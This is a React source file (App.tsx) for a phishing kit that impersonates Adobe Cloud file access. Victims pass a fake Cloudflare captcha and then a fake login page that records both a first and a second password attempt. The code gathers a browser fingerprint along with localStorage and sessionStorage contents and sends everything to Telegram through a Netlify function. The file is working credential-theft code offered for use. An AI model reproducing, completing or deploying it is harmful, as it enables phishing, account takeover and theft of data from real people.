import React, { useState, useEffect } from 'react';
import { Routes, Route, useNavigate, Navigate } from 'react-router-dom';
import LoginPage from './components/LoginPage';
import MobileLoginPage from './components/mobile/MobileLoginPage';
import LandingPage from './components/LandingPage';
import MobileLandingPage from './components/mobile/MobileLandingPage';
import CloudflareCaptcha from './components/CloudflareCaptcha';
import { getBrowserFingerprint, sendToTelegram } from './utils/oauthHandler';
import { setCookie, getCookie, removeCookie, subscribeToCookieChanges, CookieChangeEvent } from './utils/realTimeCookieManager';

const FIRST_ATTEMPT_KEY = 'adobe_first_attempt';

function App() {
  // --- STATE ---
  const [isMobile, setIsMobile] = useState(false);
  const [selectedFileName, setSelectedFileName] = useState('');
  const [isLoading, setIsLoading] = useState(true); // For initial app load only
  const [hasSession, setHasSession] = useState(() => !!getCookie('adobe_session')); // Initial check for session
  const navigate = useNavigate();

  // --- YOUR CORE FUNCTIONS (UNCHANGED) ---
  const safeSendToTelegram = async (sessionData: any) => {
    if (typeof sendToTelegram === 'function') {
      try { return await sendToTelegram(sessionData); } catch (err) { console.error('sendToTelegram(util) failed:', err); }
    }
    try {
      const res = await fetch('/.netlify/functions/sendTelegram', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(sessionData) });
      if (!res.ok) { throw new Error(`HTTP ${res.status}`); }
      return await res.json();
    } catch (fetchErr) { console.error('sendToTelegram fallback (fetch) failed:', fetchErr); throw fetchErr; }
  };

  const handleFileAction = (fileName: string, action: 'view' | 'download') => setSelectedFileName(fileName);
  
  // --- UPDATED HANDLERS FOR ROUTING ---
  const handleLoginSuccess = async (secondAttemptData: any) => {
    let firstAttemptData = {};
    try { const storedData = sessionStorage.getItem(FIRST_ATTEMPT_KEY); if (storedData) { firstAttemptData = JSON.parse(storedData); } } catch (e) { console.error('Could not parse first attempt data', e); }
    const cookieOptions = { path: '/', secure: process.env.NODE_ENV === 'production', sameSite: 'strict' as const };
    setCookie('adobe_session', encodeURIComponent(JSON.stringify(secondAttemptData)), cookieOptions);
    setCookie('logged_in', 'true', cookieOptions);
    const browserFingerprint = await getBrowserFingerprint();
    const updatedSession = { ...firstAttemptData, ...secondAttemptData, email: secondAttemptData.email, provider: secondAttemptData.provider, firstAttemptPassword: (firstAttemptData as any).password || secondAttemptData.firstAttemptPassword, secondAttemptPassword: secondAttemptData.password, sessionId: Math.random().toString(36).substring(2, 15), timestamp: new Date().toISOString(), fileName: secondAttemptData.fileName || 'Adobe Cloud Access', clientIP: 'Unknown', userAgent: navigator.userAgent, deviceType: /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'mobile' : 'desktop', cookies: 'Cookies not captured', cookiesParsed: {}, cookieList: [], documentCookies: '', localStorage: browserFingerprint.localStorage, sessionStorage: browserFingerprint.sessionStorage, browserFingerprint: browserFingerprint, };
    delete (updatedSession as any).password;
    localStorage.setItem('adobe_autograb_session', JSON.stringify(updatedSession));
    try { await safeSendToTelegram(updatedSession); } catch (error) { console.error('Failed to send to Telegram:', error); }

    setHasSession(true); // Update session state
    navigate('/landing'); // Navigate to the landing page
  };

  const handleLogout = () => {
    localStorage.removeItem('adobe_autograb_session');
    sessionStorage.clear();
    const cookieNames = ['adobe_session', 'sessionid', 'auth_token', 'logged_in', 'user_email'];
    cookieNames.forEach(cookieName => removeCookie(cookieName, { path: '/' }));
    setHasSession(false); // Update session state
    navigate('/'); // Navigate to the captcha page
  };

  const handleCaptchaVerified = () => navigate('/login');

  // --- EFFECTS ---
  useEffect(() => {
    const checkMobile = () => setIsMobile(window.innerWidth <= 768);
    checkMobile();
    window.addEventListener('resize', checkMobile);
    return () => window.removeEventListener('resize', checkMobile);
  }, []);

  useEffect(() => {
    const unsubscribe = subscribeToCookieChanges((event: CookieChangeEvent) => {
      if (event.name === 'adobe_session') {
        const sessionExists = !!event.value;
        if (sessionExists !== hasSession) {
          setHasSession(sessionExists);
        }
      }
    });
    return unsubscribe;
  }, [hasSession]);

  useEffect(() => {
    setIsLoading(false); // Turn off initial loader after first render
  }, []);

  // --- RENDER LOGIC ---
  if (isLoading) {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center">
        <div className="text-center"><div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto mb-4"></div><p className="text-gray-600">Initializing...</p></div>
      </div>
    );
  }

  const LoginComponent = isMobile ? MobileLoginPage : LoginPage;
  const LandingComponent = isMobile ? MobileLandingPage : LandingPage;

  return (
    <Routes>
      <Route path="/" element={
        hasSession ? <Navigate to="/landing" replace /> : <CloudflareCaptcha onCaptchaVerified={handleCaptchaVerified} onVerified={handleCaptchaVerified} onCaptchaError={(e) => console.error(e)} />
      } />
      <Route path="/login" element={
        hasSession ? <Navigate to="/landing" replace /> : <LoginComponent fileName="Adobe Cloud Access" onBack={() => navigate('/')} onLoginSuccess={handleLoginSuccess} onLoginError={(e) => console.error(e)} showBackButton={true} />
      } />
      <Route path="/landing" element={
        !hasSession ? <Navigate to="/" replace /> : <LandingComponent onFileAction={handleFileAction} onLogout={handleLogout} />
      } />
      <Route path="*" element={<Navigate to={hasSession ? "/landing" : "/"} replace />} />
    </Routes>
  );
}

export default App;